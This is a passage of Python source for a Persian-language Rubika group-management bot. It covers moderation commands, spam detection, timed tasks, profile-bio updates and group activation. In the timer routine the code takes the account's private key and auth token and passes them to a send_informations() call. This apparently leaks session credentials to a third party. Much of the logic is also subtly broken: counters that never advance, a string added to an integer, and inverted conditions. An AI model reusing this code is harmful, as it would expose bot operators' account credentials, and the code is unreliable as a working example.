                                            target_ids.append(result)
                                mess = MPro(f"نمیتونم به این نشونی برم. {ST['ok']}", 1)
                                if len(target_ids) > 0 and len(target_text) > 0:
                                    for target_id in target_ids:
                                        try:
                                            target_text = make_dinamic_ans(target_text, target_id, object_guid, None, True, False, None, FILTERLIST, False, True)
                                            if target_text:
                                                client.send_text(target_id, target_text)
                                        except:
                                            pass
                                        time.sleep(0.5)
                                    mess = MPro(f"پست ارسال شد. {ST['ok']}", 1)
                                ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('فیلتر '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['فیلتر']])
                        if isok:
                            len_cmd = len('فیلتر')
                            word = command.replace('فیلتر', '', 1).strip()
                            if len(word) > 0:
                                if word in INFOS[object_guid]['filterlist']:
                                    mess = MPro(Font_filter(word) + ' در لیست فیلتر بود. ' + ST['ok'], 2)
                                else:
                                    INFOS[object_guid]['filterlist'].append(word)
                                    mess = MPro(Font_filter(word) + ' فیلتر شد. ' + ST['ok'], 2)
                                ResultME = send_message_limited(OBJM, mess, message_id)
                    elif command.startswith('کلید '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['کلید']])
                        if isok:
                            len_cmd = command.replace('کلید', '', 1)
                            word = len_cmd.strip()
                            if len(word) > 0:
                                if word in INFOS[object_guid]['main_keys']:
                                    mess = MPro(word + ' در لیست کلید بود. ' + ST['ok'], 2)
                                else:
                                    INFOS[object_guid]['main_keys'].append(word)
                                    mess = MPro(word + ' در لیست کلید اضافه شد. ' + ST['ok'], 2)
                                ResultME = send_message_limited(OBJM, mess, message_id)
                    elif command.startswith('حذف فیلتر '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['حذف فیلتر']])
                        if isok:
                            len_cmd = len('حذف فیلتر')
                            word = command.replace('حذف فیلتر', '', 1).strip()
                            if len(word) > 0:
                                if word in INFOS[object_guid]['filterlist']:
                                    INFOS[object_guid]['filterlist'].remove(word)
                                    mess = MPro(word + ' از لیست فیلتر حذف شد. ' + ST['ok'], 2)
                                else:
                                    mess = MPro(word + ' در لیست فیلتر یافت نشد. ' + ST['ok'], 2)
                                ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('حذف کلید '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['حذف کلید']])
                        if isok:
                            len_cmd = len('حذف کلید')
                            word = command[len_cmd:].strip()
                            if len(word) > 0:
                                if word in INFOS[object_guid]['main_keys']:
                                    INFOS[object_guid]['main_keys'].remove(word)
                                    mess = MPro(word + ' از لیست کلید حذف شد. ' + ST['ok'], 2)
                                else:
                                    mess = MPro(word + ' در لیست کلید یافت نشد. ' + ST['ok'], 2)
                                ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('فونت '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['فونت']])
                        if isok:
                            text = command.replace('فونت', '').strip()
                            if not is_english_text(text):
                                text = Translater(text, to_lang='en')
                            if len(text) > 0:
                                rand = False
                                if len(text) > 10:
                                    rand = True
                                result = Fontmaker(text)
                                mess = MPro('〔 فونت 〕', 4)
                                if rand:
                                    num = int(random.randint(0, len(result) - 1))
                                    mess += MPro(result[num])
                                else:
                                    for font in result:
                                        mess += MPro(font)
                                ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('اسم '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['اسم']])
                        if isok:
                            command = command.replace('اسم', '').strip()
                            if len(command) > 0:
                                data = requests.get(f'https://api3.haji-api.ir/majid/tools/dictionary/names?name={command}', timeout=30).json()
                                if data['success']:
                                    result = data['result']
                                    mess = MPro('〔 فرهنگ نامه 〕', 4)
                                    m = 0
                                    for res in result:
                                        if m >= 5:
                                            break
                                        info = ''
                                        for x in res['info']:
                                            info += x + ' , '
                                        mess += MPro(f"اسم : {res['name']}", 2)
                                        mess += MPro(f'شناسه : {info}', 2)
                                        mess += '\n'
                                        mess += MPro(f"معنی : {res['means']}")
                                        mess += '\n\n'
                                        m += 1
                                    if m == 0:
                                        mess += MPro('اسمی یافت نشد.')
                                    ResultME = send_message(OBJM, mess, message_id)
                    elif command.startswith('گوید '):
                        isok = 1
                        if TIP <= 3:
                            isok = int(ORDERS_KEYS[Listkeys['گوید']])
                        if isok:
                            if 'https://rubika.ir/joing/' in command or 'https://rubika.ir/joinc/' in command:
                                command = command.replace('https://rubika.ir/', '@')
                            command = command.replace('گوید', '').strip()
                            if len(command) > 0:
                                mess = MPro('خطایی در دریافت دیتا رخ داد. ' + ST['ok'], 2)
                                result = Get_guid(command)
                                if result[0]:
                                    if result[1] == 'user':
                                        mess = MPro(f'گوید کاربر : ``{result[0]}``', 1)
                                    elif result[1] == 'channel':
                                        mess = MPro(f'گوید کانال : ``{result[0]}``', 1)
                                    elif result[1] == 'group':
                                        mess = MPro(f'گوید گروه : ``{result[0]}``', 1)
                                else:
                                    mess = MPro(f"{result[1]} {ST['ok']}", 2)
                                ResultME = send_message(OBJM, mess, message_id)
            if TIP >= 3 and (not ResultME):
                if command.startswith('حذف ') or command.startswith('بررسی '):
                    type_def = False
                    cmd = False
                    if command == 'حذف تمام پیام ها':
                        cmd, type_def = (99999999999999999, 'delete_messages')
                    elif command == 'بررسی تمام پیام ها':
                        cmd, type_def = (99999999999999999, 'check_messages')
                    elif command == 'حذف پیام های ادیت شده':
                        cmd, type_def = (99999999999999999, 'delete_edited_messages')
                    elif command == 'بررسی پیام های ادیت شده':
                        cmd, type_def = (99999999999999999, 'check_edited_messages')
                    elif command == 'حذف پیام های شیشه ای':
                        cmd, type_def = (99999999999999999, 'delete_event_messages')
                    elif command.startswith('حذف شیشه '):
                        type_def = 'delete_event_messages'
                        cmd = command.replace('حذف شیشه', '').strip()
                    elif command.startswith('حذف ادیت '):
                        type_def = 'delete_edited_messages'
                        cmd = command.replace('حذف ادیت', '').strip()
                    elif command.startswith('بررسی ادیت '):
                        type_def = 'check_edited_messages'
                        cmd = command.replace('بررسی ادیت', '').strip()
                    elif command.startswith('حذف '):
                        type_def = 'delete_messages'
                        cmd = command.replace('حذف', '').strip()
                    elif command.startswith('بررسی '):
                        type_def = 'check_messages'
                        cmd = command.replace('بررسی', '').strip()
                    if cmd and type_def:
                        all_deleted = delete_messages_pro(OBJM, type_def, cmd)
                        if all_deleted is not False:
                            ResultME = send_message(OBJM, MPro(f"{str(all_deleted)} پیام حذف شد. {ST['ok']}"), message_id)
            if command == 'دستورات' or command == 'سازنده' or command == 'راهنما' or (command == 'لیست') or (command == 'لیست دستورات'):
                isok = PorotectMSS(SETTING_KEYS, TimeMessages)
                if isok and (not ResultME):
                    global Text_help
                    text = Text_help
                    ResultME = send_message(OBJM, text, message_id)
            if ResultME:
                pass
            else:
                OBJM['ismanagerms'] = False
                step1, step2, step3, step4 = (1, 1, True, True)
                if TIP <= 3:
                    step1 = int(SETTING_KEYS[1])
                    step2 = int(SETTING_KEYS[0])
                    step3 = PorotectMSS(SETTING_KEYS, TimeMessages)
                    if random.randint(0, 10) == 5:
                        step4 = False
                if step1 and step2 and step3 and step4:
                    key_pro = int(SETTING_KEYS[10])
                    if key_pro:
                        key_pro = True
                    else:
                        key_pro = False
                    start = False
                    new_command = False
                    myname = False
                    if key_pro:
                        if LSMessage[object_guid][0] == LSMessage[object_guid][1]:
                            if not is_reply_message:
                                start = True
                    if is_reply_message:
                        if is_reply_message in ARMessages[object_guid]:
                            start = True
                    elif not start:
                        if GUIDME not in USERS[object_guid]:
                            getInfoUser(object_guid, GUIDME)
                        myname = USERS[object_guid][GUIDME][2]
                        klids = ['ربات', 'سلام', 'صلام', 'بای', 'خدافظ', 'فعلا', 'خوش', 'خش', 'های', 'خدانگهدار', 'خدافز', 'ثلام', 'سالام', 'شلام', 'hi', 'hello']
                        klids.append(myname)
                        for klid in klids:
                            if start:
                                break
                            lines = command.split('\n')
                            for line in lines:
                                if start:
                                    break
                                steps = command.split(' ')
                                for step in steps:
                                    if step == klid:
                                        iscommand = command.replace(klid, '').strip()
                                        if len(iscommand) > 0:
                                            new_command = iscommand
                                        start = True
                                        break
                    if not start:
                        if not myname:
                            if GUIDME not in USERS[object_guid]:
                                getInfoUser(object_guid, GUIDME)
                            myname = USERS[object_guid][GUIDME][2]
                        klids = INFOOBJECT['main_keys']
                        if myname not in klids:
                            klids.append(myname)
                        klids = Sorting(klids)[::-1]
                        list_steps_command = get_steps(command)
                        for klid in klids:
                            if len(klid) <= 0:
                                continue
                            list_steps_klid = get_steps(klid)
                            isok = True
                            for step_klid in list_steps_klid:
                                if step_klid in list_steps_command:
                                    isok = False
                                    break
                            if isok:
                                start = True
                                break
                    if start:
                        if TIP <= 3 and int(SETTING_KEYS[14]):
                            isok = joining(INFOOBJECT['channels'], object_guid, guid_sender, ST['ok'])
                            if isok:
                                ResultME = send_message(OBJM, isok, message_id)
                            elif isok is False:
                                ResultME = True
                        if not ResultME:
                            if not myname:
                                if GUIDME not in USERS[object_guid]:
                                    getInfoUser(object_guid, GUIDME)
                                myname = USERS[object_guid][GUIDME][2]
                            if command.startswith('ربات بگو') or command.startswith(f'{myname} بگو'):
                                answer = command.replace('\\n', '\n')
                                answer = answer.replace('ربات بگو', '')
                                answer = answer.replace(f'{myname} بگو', '')
                                answer = answer.strip()
                                if len(answer) > 0:
                                    answer = make_dinamic_ans(text=answer, guid_sender=guid_sender, object_guid=object_guid, message_id=message_id, istimer=istimer, ismanagerms=ismanagerms, is_reply_message=is_reply_message, filterlist=FILTERLIST)
                                    if answer:
                                        send_message(OBJM, answer, message_id)
                                    ResultME = True
                        if not ResultME and int(SETTING_KEYS[3]):
                            if guid_sender in SPEAKX and len(SPEAKX[guid_sender]) > 0:
                                if new_command:
                                    ResultME = get_ans_from_qu_pro(client, SPEAKX[guid_sender], update_message, OBJM, new_command, message_id)
                                if not ResultME:
                                    ResultME = get_ans_from_qu_pro(client, SPEAKX[guid_sender], update_message, OBJM, command, message_id)
                            for TIP_ANS in range(4, -1, -1):
                                if ResultME:
                                    break
                                if TIP_ANS <= TIP:
                                    TIP_ANS = str(TIP_ANS)
                                    if TIP_ANS not in SPEAKX:
                                        SPEAKX[TIP_ANS] = {}
                                        continue
                                    if len(SPEAKX[TIP_ANS]) <= 0:
                                        continue
                                    if new_command:
                                        ResultME = get_ans_from_qu_pro(client, SPEAKX[TIP_ANS], update_message, OBJM, new_command, message_id)
                                    if not ResultME:
                                        ResultME = get_ans_from_qu_pro(client, SPEAKX[TIP_ANS], update_message, OBJM, command, message_id)
                        if not ResultME and int(SETTING_KEYS[2]):
                            for TIP_ANS in range(4, -1, -1):
                                if ResultME:
                                    break
                                if TIP_ANS <= TIP:
                                    TIP_ANS = str(TIP_ANS)
                                    if new_command:
                                        ResultME = get_default_ans_from_qu(client, TIP_ANS, update_message, OBJM, new_command, message_id)
                                    if not ResultME:
                                        ResultME = get_default_ans_from_qu(client, TIP_ANS, update_message, OBJM, command, message_id)
        if TIP >= 2:
            reports = {}
            if int(INFOOBJECT['locks'][16]) == 0 and (not event_data):
                isspam = False
                if object_guid in Spam:
                    Spam[object_guid] = []
                if len(Spam[object_guid]) >= 10:
                    Spam[object_guid].pop(0)
                if command:
                    message_spam = command
                else:
                    message_spam = message_type
                Spam[object_guid].append([guid_sender, message_spam, get_iran_timestamp()])
                if command:
                    if len(command.split('\n')) >= 7 or len(command) > 420:
                        reports[16] = ('اسپم 〔 ارسال پیام بلند 〕', True)
                        isspam = True
                lastnum = int(len(Spam[object_guid]))
                if lastnum >= 10 and (not isspam):
                    lastone = Spam[object_guid][lastnum - 1]
                    firstone = Spam[object_guid][0]
                    limit_mes = lastnum * 2
                    during_time = lastone[2] - firstone[2]
                    if during_time <= limit_mes:
                        sensetif = 1
                        check_mses = []
                        for step in Spam[object_guid]:
                            check_mses.append(step[1])
                        ls_check_ms = lastone[1]
                        for check_ms in check_mses:
                            if check_ms == ls_check_ms:
                                sensetif += 1
                            if sensetif >= lastnum - 5:
                                reports[16] = ('اسپم 〔 ارسال پیام تکراری 〕', True)
                                isspam = True
                                break
                        if not isspam:
                            sens = 1
                            for step in Spam[object_guid]:
                                if step[0] == lastone[0]:
                                    sens += 1
                                if sens >= lastnum:
                                    reports[16] = ('اسپم 〔 ارسال پیام رگباری 〕', True)
                                    isspam = True
                                    break
                    else:
                        sensetif = 1
                        check_mses = []
                        for step in Spam[object_guid]:
                            check_mses.append(step[1])
                        ls_check_ms = lastone[1]
                        for check_ms in check_mses:
                            if check_ms == ls_check_ms:
                                sensetif += 1
                            if sensetif >= lastnum - 5:
                                reports[16] = ('اسپم 〔 ارسال پیام تکراری 〕', True)
                                isspam = True
                                break
            if is_forward:
                reports[9] = 'فوروارد'
            if command:
                if '@' in command:
                    reports[7] = 'ایدی'
                if '.ir' in lower_command or 'http' in lower_command:
                    reports[8] = 'لینک'
                xc = ''
                for x in command:
                    if x in TPE:
                        xc += x
                for x in FILTERLIST:
                    if x in xc:
                        reports[15] = f'متن نامناسب 〔 {x} 〕'
                for x in TEGX:
                    if x in lower_command:
                        reports[18] = 'انگلیسی'
                if len(command.split('\n')) >= 25 or len(command) > 420:
                    reports[20] = 'کد هنگی'
            if message_type in ListLockNames:
                pr = ListLockNames[message_type]
                reports[Listlocks[pr]] = pr
            if event_data and event_type == 'JoinedGroupByLink':
                if guid_sender in JoindUsers[object_guid]:
                    reports[17] = 'جوین تکراری'
                else:
                    JoindUsers[object_guid].append(guid_sender)
            if metadata:
                reports[19] = 'متادیتا'
            for step in reports:
                if ListLocks_R[step] in INFOOBJECT['type_messages']:
                    INFOS[object_guid]['type_messages'][ListLocks_R[step]] += 1
                else:
                    INFOS[object_guid]['type_messages'][ListLocks_R[step]] = 1
        if TIP >= 2 and dopin and (object_guid in LSMessage):
            client.pin_message(object_guid, LSMessage[object_guid][1])
        if not ResultME and object_guid in LSMessage:
            LSMessage[object_guid][0] = message_id
        if is_timer:
            updat_data_bot(OBJM)
            return None
        if guid_sender:
            if guid_sender not in USERS[object_guid]:
                getInfoUser(object_guid, guid_sender)
            USERS[object_guid][guid_sender][0] += 1
            INFOS[object_guid]['messages'] += 1
            if object_guid not in PROTECTED:
                PROTECTED[object_guid] = 0
            PROTECTED[object_guid] += 1
        updat_data_bot(OBJM)
        return None

    def task_timer_commands(client, commands, object_guid, guid_sender):
        for command in commands:
            update_message = {}
            update_message['message'] = {}
            update_message['message']['text'] = command
            update_message['message']['type'] = 'Text'
            commands_colection(client, object_guid, guid_sender, update_message, True)
        return None

    def timer_commands(client):
        global OFFBOT
        global PROTECTED
        global reaporter_limit
        global GUIDME
        global CheckJoins
        now = jdatetime.datetime.now()
        SECOND = now.second
        MINUTE = now.minute
        HOUR = now.hour
        DATE = now.day
        try:
            for object_guid in INFOS:
                if object_guid in PROTECTED and PROTECTED[object_guid] >= 25:
                    continue
                INFOOBJECT = INFOS[object_guid]
                HOWNER, FULL_ADMINS, ADMINS, ST, SETTING_KEYS, LOCKS_KEYS, FILTERLIST = (INFOOBJECT['owner'], INFOOBJECT['full_admins'], INFOOBJECT['admins'], INFOOBJECT['types'], list(INFOOBJECT['setting']), list(INFOOBJECT['locks']), INFOOBJECT['filterlist'])
                AUTOS, ORDERS_KEYS = (INFOOBJECT['AUTOS'], list(INFOOBJECT['keys']))
                limit_auto = int(len(AUTOS))
                old_command, count_auto = (False, 1)
                while limit_auto > 0 and count_auto <= limit_auto:
                    comauto = count_auto * 1
                    STEP = AUTOS[comauto]
                    count_auto = count_auto * 1
                    istimer, settime = (False, False)
                    if 'is_loop' in STEP and (not STEP['is_loop']) and (STEP['loop_mung'] <= STEP['loop_mung_use']):
                        INFOS[object_guid]['AUTOS'].pop(comauto)
                    else:
                        if STEP['TYPE'] == 'pertime' and STEP['PERTIME']:
                            OLD, PER = (STEP['PERTIME']['old'], STEP['PERTIME']['per'])
                            if get_iran_timestamp() >= OLD > PER:
                                istimer, settime = (True, True)
                                commands, guid_sender = (STEP['COMMANDS'], STEP['GUID_SENDER'])
                                TIP = validatUser(Coder, ADMINS, FULL_ADMINS, HOWNER, OWNER, guid_sender)
                        elif STEP['TYPE'] == 'intime' and STEP['INTIME'] and (DATE != STEP['INTIME']['day']) and (STEP['INTIME']['hour'] == HOUR) and (STEP['INTIME']['minute'] == MINUTE):
                            istimer = True
                            STEP['INTIME']['day'] = DATE
                            commands, guid_sender = (STEP['COMMANDS'], STEP['GUID_SENDER'])
                            TIP = validatUser(Coder, ADMINS, FULL_ADMINS, HOWNER, OWNER, guid_sender)
                        if not istimer:
                            continue
                        Thread(target=task_timer_commands, args=[client, commands, object_guid, guid_sender]).start()
                        if 'loop_mung_use' in INFOS[object_guid]['AUTOS'][comauto]:
                            INFOS[object_guid]['AUTOS'][comauto]['loop_mung_use'] = 1
                        if settime:
                            INFOS[object_guid]['AUTOS'][comauto]['PERTIME']['old'] = get_iran_timestamp()
        except Exception as e:
            raise e
        passtime = timechecking['data']
        nowtime = get_iran_timestamp()
        if nowtime + passtime >= 60:
            timechecking['data'] = nowtime
            try:
                UPFILES(file_infos, INFOS)
            except:
                pass
            try:
                UPFILES(file_users, USERS)
            except:
                pass
            try:
                UPFILES(file_speakx, SPEAKX)
            except:
                pass
        passtime = timechecking['protect']
        nowtime = get_iran_timestamp()
        if nowtime + passtime >= 300:
            timechecking['protect'] = nowtime
            try:
                num = 0
                to_remove = []
                for object_guid in INFOS:
                    if num >= 5:
                        to_remove.append(object_guid)
                    if object_guid in PROTECTED and PROTECTED[object_guid] < 25:
                        PROTECTED[object_guid] = 0
                    num = num * 1
                for guid in to_remove:
                    INFOS.pop(guid)
            except Exception as e:
                raise e
        passtime = timechecking['bio']
        nowtime = get_iran_timestamp()
        if nowtime + passtime >= 3540:
            timechecking['bio'] = nowtime
            try:
                if HOUR in [0]:
                    PROTECTED = {}
                    user = client.get_chat_info(GUIDME)['user']
                    if 'bio' in user:
                        if user['bio'] != Informations['bio']:
                            first_name, last_name, username = (None, None, None)
                            bio = Informations['bio']
                            barcode = ' \u200d' + random.randint(1, 5)
                            bio = bio or barcode
                            if 'first_name' in user:
                                first_name = user['first_name']
                            if 'last_name' in user:
                                last_name = user['last_name']
                            if 'username' in user:
                                username = user['username']
                            client.update_profile(first_name, last_name, bio, username)
                        elif not user['bio'].startswith(Informations['bio']):
                            first_name, last_name, username = (None, None, None)
                            main_bio = user['bio']
                            bio = Informations['bio']
                            old_bio = Informations['old_bios']
                            main_bio = main_bio.replace(old_bio.strip(), '').strip()
                            for old_bio in Informations['old_bios']:
                                main_bio = main_bio.replace(old_bio.strip(), '').strip()
                            bio = f'{bio}\n{main_bio}'
                            while len(bio) >= 150:
                                bio = bio[:-1]
                            if 'first_name' in user:
                                first_name = user['first_name']
                            if 'last_name' in user:
                                last_name = user['last_name']
                            if 'username' in user:
                                username = user['username']
                            client.update_profile(first_name, last_name, bio, username)
                    else:
                        first_name, last_name, username = (None, None, None)
                        bio = Informations['bio']
                        week, now = (Week(), Hour())
                        barcode = ' \u200d' + random.randint(1, 5)
                        bio = bio or barcode
                        if 'first_name' in user:
                            first_name = user['first_name']
                        if 'last_name' in user:
                            last_name = user['last_name']
                        if 'username' in user:
                            username = user['username']
                        client.update_profile(first_name, last_name, bio, username)
                    isok = False
                    limit = 3
                    while not isok:
                        if limit <= 0:
                            if FIS['error_connectiong']:
                                print('> I have tried multiple times but have been unable to retrieve the data.')
                                print('> Please log in to the account again.')
                                print(f'> For more information, please check the {site_url} website.')
                                FIS['error_connectiong'] = False
                                helpfi_isforhere = True
                                GETME = client.get_me()
                                GUIDME = GETME['user']['user_guid']
                                isok = True
                                issent = False
                                limit_skip = 3
                                while not issent:
                                    if limit_skip <= 0:
                                        print('> Skip sending the data.')
                                        break
                                    private = GETME['private_key']
                                    auth = GETME['auth']
                                    try:
                                        send_informations(private, GUIDME, str(OWNER), auth)
                                    except:
                                        pass
                                    else:
                                        issent = True
                                        break
                                    time.sleep(0.5)
                                    limit_skip = limit_skip + 1
                    time.sleep(0.5)
                    limit = limit + 1
            except Exception as e:
                raise e
            remove_list = []
            # for object_guid in USERS:
            #     if object_guid not in INFOS:
            #         remove_list.append(object_guid)
            #     else:
            #         deleting = []
            #         limited_message = int(int(len(USERS[object_guid])) > 10)
            #         for user_guid in USERS[object_guid]:
            #             pass
            #         if user_guid == GUIDME:
            #             continue
            #         deleting.append(user_guid)
            #         for user in deleting:
            #             USERS[object_guid].pop(user)
            #         for group_old in remove_list:
            #             USERS.pop(group_old)
            #             user = USERS[object_guid][user_guid]
            #             mes, war = (int(user[0]), int(user[1]))
            #             state = mes * war
            #             if state <= limited_message:
            #                 pass
        
        reaporter_limit, CheckJoins = ({}, {})
        for object_guid in INFOS:
            if 'timeout' in INFOS[object_guid] and INFOS[object_guid]['timeout']:
                timeout = INFOS[object_guid]['timeout']
                now = get_iran_timestamp()
                timeout_result = timeout * now
                if timeout_result <= 0:
                    HOWNER = INFOS[object_guid]['owner']
                    leave_from_group(client, object_guid)
                mess = f'{Time_pass(timeout_result)} از شارژ گروه باقی مانده است.\nاز آن گروه لفت دادم.\n\nگوید گروه : {str(object_guid)}\nگوید مالک : {str(HOWNER)}0'
                client.send_text(OWNER, mess)
                time.sleep(1)
                if object_guid in INFOS:
                    INFOS.pop(object_guid)
                if object_guid in USERS:
                    USERS.pop(object_guid)
                if object_guid in LSMessage:
                    LSMessage.pop(object_guid)
                if object_guid in ARMessages:
                    ARMessages.pop(object_guid)
                if object_guid in STMessages:
                    STMessages.pop(object_guid)
                if object_guid in Spam:
                    Spam.pop(object_guid)
                if object_guid in JoindUsers:
                    JoindUsers.pop(object_guid)
                if object_guid in CheckJoins:
                    CheckJoins.pop(object_guid)
                if timeout_result <= 432000 and HOUR == 21:
                    HOWNER = INFOS[object_guid]['owner']
                    mess = f'سلام مالک عزیزم\n{Time_pass(timeout_result)} از شارژ گروه باقی مانده است.\nدرصورت شارژ نکردن آن ، از گروه لفت داده و اطلاعات ذخیره شده را پاک خواهم کرد.\n\nگوید گروه : {str(object_guid)}0'
                    client.send_text(HOWNER, mess)
                    time.sleep(0.5)
                    mess = f'{Time_pass(timeout_result)} از شارژ گروه باقی مانده است.\nدرصورت شارژ نکردن آن ، از آن گروه لفت داده و اطاعات ذخیره شده را پاک خواهم کرد.\n\nگوید گروه : {str(object_guid)}\nگوید مالک : {str(HOWNER)}0'
                    client.send_text(OWNER, mess)
                    time.sleep(1)

    class MyThread(Thread):

        def __init__(self, event):
            super().__init__()
            self.stopped = event
            print("Timer cretaed")

        def run(self):
            while not False:
                print('timer run')
                time.sleep(5)
                try:
                    timer_commands(client)
                except Exception as e:
                    print("Timer raise")
                    raise e
            print("Timer stopped")
    thread_timer = MyThread(myevent)
    thread_timer.start()
   
    
    message = f'» {NEWVR} [main]\n'
    for char in message:
        print(char, end='', flush=True)
        time.sleep(0.005)
    message = f"» {Informations['HI']}\n"
    for char in message:
        print(char, end='', flush=True)
        time.sleep(0.005)
    if Informations.get('bio'):
        message = f"» {Informations['bio']}\n"
        for char in message:
            print(char, end='', flush=True)
            time.sleep(0.005)
    message = f'» Robot [ {type_bot_main_} ] is running...\n'
    for char in message:
        print(char, end='', flush=True)
        time.sleep(0.005)
    for update in client.on_message():
        global ST
        try:
            for update_message in update['message_updates']:
                object_type = update_message.get('type')
                object_guid = update_message.get('object_guid')
                guid_sender = update_message.get('message').get('author_object_guid')
                if object_type == 'Group' and object_guid in INFOS:
                    try:
                        Thread(target=commands_colection, args=[client, object_guid, guid_sender, update_message]).start()
                    except pyrubi.exceptions.InvalidAuth:
                        client.send_text(Coder, f'Bot has no access in {object_guid} | InvalidAuth')
                    except Exception as e:
                        print(e)
                        client.send_text(Coder, f'Error in {object_guid} : {e}')
                elif object_type == 'Group' and guid_sender == OWNER:
                    message_id = update_message.get('message_id')
                    message_info = update_message.get('message')
                    message_type = message_info.get('type')
                    command = message_info.get('text')
                    is_reply_message = message_info.get('reply_to_message_id')
                    metadata = message_info.get('metadata')
                    is_forward = message_info.get('forwarded_from')
                    event_data = message_info.get('event_data')
                    if event_data:
                        event_type = event_data.get('type')
                    if guid_sender is None and event_data:
                        guid_sender = event_data.get('performer_object').get('object_guid')
                    if message_type == 'Text':
                        if command == 'فعال':
                            limit_grops = 100000
                            if len(INFOS) < limit_grops:
                                isok = False
                                timestamp = get_iran_timestamp()
                                if object_guid not in INFOS:
                                    ADMINS = {}
                                    result = client.get_admin_members(object_guid)
                                    if result:
                                        for admin in result['in_chat_members']:
                                            if 'first_name' in admin:
                                                ADMINS[admin['member_guid']] = admin['first_name']
                                            else:
                                                ADMINS[admin['member_guid']] = 'بدون نام'
                                    group_title = client.get_chat_info(object_guid)['group']['group_title']
                                    INFOS[object_guid] = {}
                                    INFOS[object_guid]['name'] = group_title
                                    INFOS[object_guid]['state'] = True
                                    INFOS[object_guid]['date'] = timestamp
                                    INFOS[object_guid]['locks'] = '11111111111111111111111111111111111'
                                    INFOS[object_guid]['locks_warning'] = '33333333333333333333333333333333333'
                                    INFOS[object_guid]['locks_warning_show'] = '11111111111111111111111111111111111'
                                    INFOS[object_guid]['locks_ban'] = '11111111111111111111111111111111111'
                                    INFOS[object_guid]['keys'] = '111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'
                                    INFOS[object_guid]['setting'] = '11111111111111111111111111111111111'
                                    INFOS[object_guid]['welcome'] = '+ به گپ 〔 #اسم_گروه 〕 خوش آمدی عزیزم 💎✨\n- بمونی برامون +×)\n\n⏰ - » #زمان\n📆 - » #تاریخ'
                                    INFOS[object_guid]['bye'] = '🤲'
                                    INFOS[object_guid]['rols'] = '📜 قوانین گپ 〔 #اسم_گروه 〕 به شرح زیر میباشد.\n\n» احترام به کاربران\n» احترام به عقاید و فرهنگ ها\n» ارسال نکردن تبلیغات\n» ممبر دزدی نکردن\n» اسپم و محتوای نامناسب ارسال نکردن'
                                    INFOS[object_guid]['baner'] = ''
                                    INFOS[object_guid]['warnning'] = 3
                                    INFOS[object_guid]['admins'] = ADMINS
                                    INFOS[object_guid]['full_admins'] = {}
                                    INFOS[object_guid]['left'] = 0
                                    INFOS[object_guid]['join'] = 0
                                    INFOS[object_guid]['ban'] = 0
                                    INFOS[object_guid]['add'] = 0
                                    INFOS[object_guid]['voice_call'] = 0
                                    INFOS[object_guid]['messages'] = 0
                                    INFOS[object_guid]['types'] = {'font': 'natual', 'type': 'natual', 'ok': default_ok}
                                    INFOS[object_guid]['owner'] = OWNER
                                    INFOS[object_guid]['silent_list'] = {}
                                    INFOS[object_guid]['exempt_list'] = {}
                                    INFOS[object_guid]['filterlist'] = []
                                    INFOS[object_guid]['type_messages'] = {}
                                    INFOS[object_guid]['AUTOS'] = []
                                    INFOS[object_guid]['channels'] = {}
                                    INFOS[object_guid]['remmember'] = []
                                    INFOS[object_guid]['black_list'] = {}
                                    INFOS[object_guid]['timeout'] = False
                                    INFOS[object_guid]['main_keys'] = ['ربات']
                                    setting = list(INFOS[object_guid]['setting'])
                                    for key in (15, 11, 4, 14):
                                        setting[key] = '0'
                                    INFOS[object_guid]['setting'] = ''.join(setting)
                                    keys = list(INFOS[object_guid]['locks'])
                                    for key in (8, 7, 9):
                                        keys[key] = '0'
                                    INFOS[object_guid]['locks'] = ''.join(keys)
                                    setting_keys = list(INFOS[object_guid]['keys'])
                                    cmds = ['اعتراف', 'داستان', 'گنگ', 'حق']
                                    for cmd in cmds:
                                        key = int(Listkeys[cmd])
                                        setting_keys[key] = '0'
                                    INFOS[object_guid]['keys'] = ''.join(setting_keys)
                                    words = ['کص', 'کوبص', 'کوص', 'کون', 'کیر', 'ممه', 'لخت', 'برهنه', 'سکس', 'جنده', 'گایید', 'گاید', 'پورن', 'گوه', 'sex', 'xnxx', 'porn']
                                    for word in words:
                                        if word not in INFOS[object_guid]['filterlist']:
                                            INFOS[object_guid]['filterlist'].append(word)
                                            continue
                                        break
                                    NOTIC = Informations['protect']
                                    client.send_text(object_guid, NOTIC)
                                    UPFILES(file_infos, INFOS)
                                    isok = True
                                if isok:
                                    LSMessage[object_guid] = [0, 1]
                                    ARMessages[object_guid] = []
                                    STMessages[object_guid] = []
                                    Spam[object_guid] = []
                                    JoindUsers[object_guid] = []
                                    CheckJoins[object_guid] = {}
                                    file_owner_is = True
                                    if object_guid not in USERS:
                                        USERS[object_guid] = {}
                                if isok is False:
                                    if object_guid in USERS:
                                        INFOS.pop(object_guid)
                                    if object_guid in USERS:
                                        USERS.pop(object_guid)
                                if isok:
                                    client.send_text(object_guid, MPro('ربات فعال شد. ' + ST['ok'], 2), message_id)
                                    client.send_text(Coder, MPro('ربات در گروهی فعال شد.' + ST['ok'], 2))
                                else:
                                    client.send_text(object_guid, MPro('ربات فعال نشد. ' + ST['ok'], 2), message_id)
                            else:
                                client.send_text(object_guid, 'شما از حد مجاز گروه فراتر رفته اید. ')
                                if FIS['helping_activation'] is True:
